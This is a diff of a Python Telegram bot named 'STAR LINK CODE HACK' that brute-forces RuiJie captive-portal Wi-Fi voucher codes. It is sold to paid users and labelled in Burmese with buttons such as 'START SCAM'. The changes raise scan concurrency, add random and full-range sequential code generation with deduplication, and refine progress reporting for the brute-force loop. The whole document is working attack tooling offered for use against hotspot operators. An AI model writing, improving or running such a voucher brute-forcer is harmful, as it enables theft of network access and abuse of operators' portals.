@@ -5,7 +5,7 @@ STAR LINK CODE HACK — Professional Edition
 Production-grade RuiJie captive-portal voucher scanner.
 
 Author  : God-tier refactor
-Version : 2.1.0
+Version : 3.0.0 (Full Fixed + Random Fix + Optimized)
 """
 from __future__ import annotations
 
@@ -47,17 +47,18 @@ WEB_PORT: int = int(
     or "8099"
 )
 
-MAX_CONCURRENT_SCANS: int = 40
+MAX_CONCURRENT_SCANS: int = 100
 CONCURRENCY: int = 1000
 BATCH_SIZE: int = 500
 KEY_RECHECK_INTERVAL: float = 600.0
 
 SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS
 
-# Optional outbound proxies (unused by default in this build)
+# ============================================================
+# PROXY CONFIGURATION
+# ============================================================
+PROXY_ENABLED: bool = False
 PROXY_LIST: List[str] = []
-_proxy_index = 0
-_proxy_lock = asyncio.Lock()
 
 # ============================================================
 # LOGGING
@@ -298,8 +299,8 @@ def get_main_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
-        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
-        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
+        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
+        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
         InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
         InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
         InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
@@ -327,7 +328,8 @@ def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=5)
     btns = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
     kb.add(*btns)
-    kb.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
+    kb.add(InlineKeyboardButton("🎲 Random (တကယ် Random)", callback_data=f"digit_{mode}_random"))
+    kb.add(InlineKeyboardButton("🔢 Sequential 000000-999999", callback_data=f"digit_{mode}_seq"))
     kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
     return kb
 
@@ -392,7 +394,7 @@ async def is_paid(user_id: str) -> bool:
     return False
 
 # ============================================================
-# MESSAGE EDIT HELPERS (centralized — prevents arg-order bugs)
+# MESSAGE EDIT HELPERS
 # ============================================================
 async def safe_edit_text(chat_id: int, message_id: int, text: str,
                          reply_markup: Optional[InlineKeyboardMarkup] = None) -> bool:
@@ -673,7 +675,6 @@ async def _start_scan(chat_id: int, mode: str, message=None,
                       user_name: Optional[str] = None) -> bool:
     user_id = str(chat_id)
 
-    # --- auth ---
     if not await is_paid(user_id):
         await safe_send(
             chat_id,
@@ -682,18 +683,15 @@ async def _start_scan(chat_id: int, mode: str, message=None,
         )
         return False
 
-    # --- session ---
     if chat_id not in user_data or "session_url" not in user_data[chat_id]:
         await safe_send(chat_id, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
         return False
 
-    # --- duplicate scan ---
     existing = scan_tasks.get(chat_id)
     if existing and not existing["task"].done():
         await safe_send(chat_id, "Scan သည် အလုပ်လုပ်နေပြီ။ STOP SCAM ဖြင့် ရပ်နိုင်ပါသည်။")
         return False
 
-    # --- validate mode early (before consuming slot) ---
     try:
         test_iter = iter_codes(mode, start_digit=None)
         try:
@@ -704,11 +702,10 @@ async def _start_scan(chat_id: int, mode: str, message=None,
         await safe_send(chat_id, str(e))
         return False
 
-    # --- acquire slot ---
     if not await acquire_scan_slot():
         await safe_send(
             chat_id,
-            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခခဏစောင့်ပါ။",
+            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခဏစောင့်ပါ။",
         )
         return False
 
@@ -721,7 +718,6 @@ async def _start_scan(chat_id: int, mode: str, message=None,
 
     scan_id = str(uuid.uuid4())
 
-    # --- notify admins ---
     try:
         if user_name is None and message is not None:
             fu = getattr(message, "from_user", None)
@@ -783,13 +779,15 @@ async def cmd_status(message):
     uptime = int(time.monotonic() - _start_time)
     h, rem = divmod(uptime, 3600)
     m, s = divmod(rem, 60)
+    proxy_status = "ENABLED" if PROXY_ENABLED else "DISABLED"
     await bot.reply_to(
         message,
         f"🪫 Bot Status\n\n"
         f"⏳ Uptime: {h}h {m}m {s}s\n"
         f"🔍 Active Scans: {active}/{MAX_CONCURRENT_SCANS}\n"
         f"🎫 Paid Users: {len(paid_users)}\n"
-        f"👥 Sessions: {len(user_data)}",
+        f"👥 Sessions: {len(user_data)}\n"
+        f"🌐 Proxy: {proxy_status}",
     )
 
 @bot.message_handler(commands=["recheck"])
@@ -997,7 +995,9 @@ async def on_callback(call):
             if mode in ("6", "7", "8", "9"):
                 await safe_edit_text(
                     chat_id, call.message.message_id,
-                    f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
+                    f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —\n\n"
+                    f"🎲 Random = တကယ် Random ကုဒ်များ\n"
+                    f"🔢 Sequential = 000000-999999 အစဉ်လိုက်",
                     get_digit_keyboard(mode),
                 )
                 return
@@ -1017,8 +1017,23 @@ async def on_callback(call):
             _, mode, digit = parts
             user_data.setdefault(chat_id, {})
             user_data[chat_id]["selected_mode"] = mode
-            user_data[chat_id]["start_digit"] = None if digit == "random" else digit
-            label = "Random" if digit == "random" else f"{digit} မှစ၍"
+            
+            if digit == "random":
+                # Random mode: start_digit = None (True Random)
+                user_data[chat_id]["start_digit"] = None
+                user_data[chat_id]["random_mode"] = True
+                label = "🎲 Random (တကယ် Random)"
+            elif digit == "seq":
+                # Sequential full range
+                user_data[chat_id]["start_digit"] = None
+                user_data[chat_id]["random_mode"] = False
+                label = "🔢 Sequential 000000-999999"
+            else:
+                # Specific digit start
+                user_data[chat_id]["start_digit"] = digit
+                user_data[chat_id]["random_mode"] = False
+                label = f"🔢 {digit} မှစ၍"
+            
             await safe_edit_text(
                 chat_id, call.message.message_id,
                 f"🔍 VOUCHER: {mode}\n🔢 ထိပ်စီး: {label}\n\n✅ START SCAM ကိုနှိပ်ပါ။",
@@ -1059,7 +1074,7 @@ async def on_callback(call):
             pass
 
 # ============================================================
-# CODE GENERATORS
+# CODE GENERATORS (FIXED — True Random Support)
 # ============================================================
 _LOWER = string.ascii_lowercase
 _LOWER_DIGIT = string.ascii_lowercase + string.digits
@@ -1073,26 +1088,58 @@ def _rand_lower(n: int) -> str:
 def _rand_mixed(n: int) -> str:
     return "".join(random.choices(_LOWER_DIGIT, k=n))
 
-def iter_codes(mode: str, start_digit: Optional[str] = None) -> Iterator[str]:
-    """Streaming generator — no huge lists in RAM."""
+def iter_codes(mode: str, start_digit: Optional[str] = None,
+               random_mode: bool = False) -> Iterator[str]:
+    """
+    Streaming generator — no huge lists in RAM.
+    
+    Modes:
+      - "6".."9": numeric codes
+          - random_mode=True: truly random codes with dedup
+          - start_digit (0-9): sequential scan of that digit range
+          - neither: sequential full range 0-10^length
+      - "ascii-lower" / "ascii-lower9": random lowercase
+      - "all" / "mixed" / "mixed8" / "mixed9": random mixed
+    """
     if mode in ("6", "7", "8", "9"):
         length = int(mode)
-        if length == 9:
-            while True:
-                yield _rand_digits(9)
-            return
 
+        # --- Sequential mode (start_digit specified) ---
         if start_digit is not None and str(start_digit).isdigit():
             d = int(start_digit)
             start = d * (10 ** (length - 1))
             end = (d + 1) * (10 ** (length - 1))
-        else:
-            start, end = 0, 10 ** length
+            for i in range(start, end):
+                yield str(i).zfill(length)
+            return
 
+        # --- Random mode (True Random) ---
+        if random_mode:
+            seen: Set[str] = set()
+            # Cap memory: 6-digit = 1M max, 7+ = 500K cap
+            max_seen = (10 ** length) if length == 6 else 500_000
+            yielded_count = 0
+            
+            while True:
+                code = _rand_digits(length)
+                if code not in seen:
+                    seen.add(code)
+                    yielded_count += 1
+                    yield code
+                    # Reset when we've seen enough (prevent memory overflow)
+                    if len(seen) >= max_seen:
+                        log.debug("Random dedup set reset (length=%d, yielded=%d)",
+                                  length, yielded_count)
+                        seen.clear()
+            return
+
+        # --- Sequential full range (default for digit_*_seq) ---
+        start, end = 0, 10 ** length
         for i in range(start, end):
             yield str(i).zfill(length)
         return
 
+    # --- Random letter/mixed modes ---
     if mode == "ascii-lower":
         while True:
             yield _rand_lower(6)
@@ -1114,15 +1161,18 @@ def iter_codes(mode: str, start_digit: Optional[str] = None) -> Iterator[str]:
 # ============================================================
 # PROGRESS FORMAT
 # ============================================================
-def format_progress(checked: int, total: Optional[int], speed: float, found: int) -> str:
+def format_progress(checked: int, total: Optional[int], speed: float,
+                    found: int, mode: str = "") -> str:
     speed_str = f"{speed:,.0f} codes/min"
+    mode_tag = f" [{mode}]" if mode else ""
+    
     if total is not None:
         bar_len = 20
-        pct = (checked / total) * 100 if total else 0
+        pct = min((checked / total) * 100, 100) if total else 0
         filled = min(bar_len, int(pct / 5))
         bar = "█" * filled + "░" * (bar_len - filled)
         return (
-            "🔍 Voucher Code ရှာဖွေနေသည်...\n\n"
+            f"🔍 Voucher Code ရှာဖွေနေသည်...{mode_tag}\n\n"
             f"📦 စစ်ဆေးနေသည် : {checked:,}/{total:,}\n"
             f"📊 Progress : {pct:.2f}%\n"
             f"⚡ အမြန်နှုန်း : {speed_str}\n"
@@ -1130,7 +1180,7 @@ def format_progress(checked: int, total: Optional[int], speed: float, found: int
             f"[{bar}]"
         )
     return (
-        "🔍 Voucher Code ရှာဖွေနေသည်...\n\n"
+        f"🔍 Voucher Code ရှာဖွေနေသည်...{mode_tag}\n\n"
         f"📦 စစ်ဆေးနေသည် : {checked:,}\n"
         f"⚡ အမြန်နှုန်း : {speed_str}\n"
         f"✅ Success code hit : {found}\n"
@@ -1422,22 +1472,37 @@ async def perform_check(session_url: str, code: str, chat_id: int,
     return None
 
 # ============================================================
-# RUN BRUTEFORCE
+# RUN BRUTEFORCE (Fixed Random Mode)
 # ============================================================
 async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str,
                          message=None, progress_msg=None,
                          start_digit: Optional[str] = None):
+    # Determine random_mode from user_data
+    random_mode = user_data.get(chat_id, {}).get("random_mode", False)
+    # If start_digit is not None, it's never random
+    if start_digit is not None:
+        random_mode = False
+
     try:
-        code_iter = iter_codes(mode, start_digit=start_digit)
+        code_iter = iter_codes(mode, start_digit=start_digit, random_mode=random_mode)
     except ValueError as e:
         await safe_send(chat_id, str(e))
         await release_scan_slot()
         return
 
-    total: Optional[int] = 10 ** int(mode) if mode in ("6", "7", "8") else None
+    # Total for progress display
+    if mode in ("6", "7", "8"):
+        total: Optional[int] = 10 ** int(mode)
+    elif mode == "9":
+        total = None  # Too large
+    else:
+        total = None  # Random letter modes
+
     checked = 0
     scan_start = time.monotonic()
     last_key_check = scan_start
+    last_progress_update = 0.0
+    PROGRESS_INTERVAL = 2.0  # Update progress every 2 seconds
 
     try:
         sem = await get_voucher_sem()
@@ -1473,28 +1538,34 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
             await asyncio.gather(*(_check(c) for c in batch), return_exceptions=True)
             checked += len(batch)
 
-            # progress update
-            found = len(success_texts.get(chat_id, []))
-            elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            text = format_progress(checked, total, speed, found)
+            # Progress update (throttled to every 2 seconds)
+            now = time.monotonic()
+            if now - last_progress_update >= PROGRESS_INTERVAL:
+                last_progress_update = now
+                found = len(success_texts.get(chat_id, []))
+                elapsed = now - scan_start
+                speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                text = format_progress(checked, total, speed, found, mode=mode)
 
-            if progress_msg is not None:
-                ok = await safe_edit_text(chat_id, progress_msg.message_id, text)
-                if not ok:
-                    try:
-                        new = await bot.send_message(chat_id, text)
-                        progress_msg.message_id = new.message_id
-                    except Exception as e:
-                        log.debug("progress send error: %s", e)
+                if progress_msg is not None:
+                    ok = await safe_edit_text(chat_id, progress_msg.message_id, text)
+                    if not ok:
+                        try:
+                            new = await bot.send_message(chat_id, text)
+                            progress_msg.message_id = new.message_id
+                        except Exception as e:
+                            log.debug("progress send error: %s", e)
 
         # Completed
         if progress_msg is not None:
             found = len(success_texts.get(chat_id, []))
+            elapsed = time.monotonic() - scan_start
+            speed = (checked / elapsed * 60) if elapsed > 0 else 0
             if total is not None:
                 finish = (
                     "🔍 ရှာဖွေမှုပြီးဆုံးပါပြီ\n\n"
                     f"📦 စစ်ဆေးမှု : {checked:,}/{total:,}\n"
+                    f"⚡ အမြန်နှုန်း : {speed:,.0f} codes/min\n"
                     f"✅ ရှာတွေ့ထားသော Code : {found}\n"
                     "📊 Progress : 100%\n[██████████████████]"
                 )
@@ -1502,6 +1573,7 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
                 finish = (
                     "🔍 ရှာဖွေမှုပြီးဆုံးပါပြီ\n\n"
                     f"📦 စစ်ဆေးမှု : {checked:,}\n"
+                    f"⚡ အမြန်နှုန်း : {speed:,.0f} codes/min\n"
                     f"✅ ရှာတွေ့ထားသော Code : {found}\n"
                     "📊 Progress : 100%\n[██████████████████]"
                 )
@@ -1557,13 +1629,11 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         "accept-language": "en-US,en;q=0.9",
         "user-agent": _UA_HTML,
     }
-    proxy = None  # proxies disabled by default
     if session is None:
         return False
     try:
         async with session.get(
-            session_url, allow_redirects=True, headers=headers,
-            proxy=proxy, timeout=15,
+            session_url, allow_redirects=True, headers=headers, timeout=15,
         ) as resp:
             if resp.status >= 400:
                 return False
@@ -1612,14 +1682,12 @@ async def web_server():
     log.info("Web server listening on port %d", WEB_PORT)
 
 # ============================================================
-# POLLING (with proper timeouts)
+# POLLING
 # ============================================================
 async def start_polling():
     backoff = 5
     while True:
         try:
-            # timeout=30: Telegram long-poll window
-            # request_timeout=90: aiohttp must survive past Telegram's window
             await bot.infinity_polling(timeout=30, request_timeout=90)
             return
         except asyncio.CancelledError:
@@ -1669,7 +1737,6 @@ async def main():
     _get_conn()
     await load_paid_users()
 
-    # verify token quickly
     try:
         me = await bot.get_me()
         log.info("Bot authorized as @%s (id=%s)", me.username, me.id)
